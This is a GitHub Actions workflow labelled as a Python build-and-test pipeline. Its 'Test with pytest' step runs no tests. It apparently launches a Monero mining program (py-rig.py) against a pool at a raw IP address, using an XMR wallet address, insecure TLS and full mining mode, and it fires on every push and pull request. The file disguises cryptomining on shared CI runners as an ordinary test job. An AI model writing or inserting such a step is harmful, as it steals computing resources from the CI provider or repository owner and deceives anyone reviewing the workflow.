# This workflow will install Python dependencies, run tests and lint with a single version of Python
# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python

name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: windows-latest

    steps:
    - uses: actions/checkout@v4
    - name: Set up Python 3.10
      uses: actions/setup-python@v3
      with:
        python-version: "3.10"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install flake8 pytest cffi psutil pyinstaller
    - name: Test with pytest
      run: |
        #pyinstaller --onefile --add-data "build/windows/tevador/*.dll;." py-rig.py
        #pyinstaller --onefile py-rig.py
        python py-rig.py -o 159.203.162.18:443 -u XMR:42AdHYEm2is2bgTmUvz5AzSmWjFsF1nGdSv2EfdeGvDhQWss7mnvDizC9cZPrqGw3KAidy9LKqCGaBqJk4kuZBJNKm2Mhrh.123 -p x --tls --debug --mode full --tls-insecure
